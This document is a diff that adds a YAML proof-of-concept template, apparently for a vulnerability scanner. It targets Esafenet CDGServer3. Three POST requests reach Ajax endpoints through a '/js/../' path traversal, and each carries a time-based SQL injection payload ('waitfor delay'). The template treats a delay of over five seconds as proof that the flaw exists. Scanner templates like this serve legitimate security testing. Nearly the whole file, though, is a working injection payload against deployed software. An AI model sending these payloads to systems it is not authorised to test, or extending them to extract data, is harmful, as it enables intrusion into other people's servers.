@@ -1,0 +1,37 @@
+name: poc-yaml-esafenet-sqli
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /CDGServer3/js/../LogicGroupAjax
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: command=isExist&logicGroupName=-1'waitfor delay '0:0:5'--
+        expression: response.latency > 5000
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /CDGServer3/js/../DeviceAjax
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: command=delSecureUsb&SecureUsbid=-1'waitfor delay '0:0:5'--
+        expression: response.latency > 5000
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /CDGServer3/js/../NetSecPolicyAjax
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: command=upPriority&id=-1'waitfor delay '0:0:5'--
+        expression: response.latency > 5000
+#expression: r0() && r1() && r2()
+expression: r0()
+detail:
+    author: Greshow
+    links:
+        - https://github.com/Greshow/pocs/blob/main/esafenet-sqli/README.md
